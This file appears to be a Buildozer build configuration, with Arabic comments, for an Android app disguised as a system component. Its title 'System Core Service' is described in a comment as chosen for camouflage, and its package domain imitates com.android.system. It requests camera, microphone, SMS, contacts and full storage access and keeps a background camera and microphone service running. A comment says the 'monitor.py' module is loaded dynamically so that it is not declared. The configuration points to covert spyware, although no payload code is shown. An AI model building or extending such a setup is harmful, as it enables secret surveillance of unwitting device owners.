[app]
# (اسم التطبيق الظاهر للمستخدم (تم تغييره ليكون أكثر تمويهاً
title = System Core Service
# اسم الحزمة الداخلي
package.name = syscore.service
# النطاق البرمجي
package.domain = com.android.system

# المصادر التي سيتم تضمينها في الحزمة
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests,__pycache__,docs,.github,.sys_runtime

# ✅ رفع الإصدار لضمان تثبيت نظيف فوق النسخ القديمة وحل مشاكل كلمة السر والتسجيل
version = 3.0.1

# ✅ المتطلبات البرمجية: حذف opencv-python نهائياً → APK بحجم ~25-30MB
# استخدام tflite-runtime بدلاً من tensorflow الكامل + numpy و pillow للصور
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tflite-runtime

# أيقونة التطبيق (تأكد من وجود الملف في هذا المسار)
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ✅ الصلاحيات الكاملة المطلوبة للتحكم في الخلفية وأندرويد 13+
# تم إضافة READ_MEDIA_* و FOREGROUND_SERVICE_* و READ_CONTACTS, READ_SMS
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

# إعدادات SDK/NDK (تم تثبيتها لأفضل استقرار مع Kivy 2.3.0)
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.build_tools_ver = 33.0.0
android.accept_sdk_license = True

# ✅ التركيز على المعالجات الحديثة → سرعة أفضل للذكاء الاصطناعي و APK أصغر
android.archs = arm64-v8a

# إعدادات النظام والتشغيل
android.allow_backup = False
android.request_legacy_external_storage = True

# ✅ إعدادات العمل في الخلفية (Foreground Service) → يمنع قتل التطبيق عند قفل الشاشة
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.uses_cleartext_traffic = True

# إعدادات الشاشة والعرض
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

# ❌ تم حذف android.services نهائياً لأن monitor.py يُحمَّل ديناميكياً عبر main.py

[buildozer]
log_level = 2
warn_on_root = 1
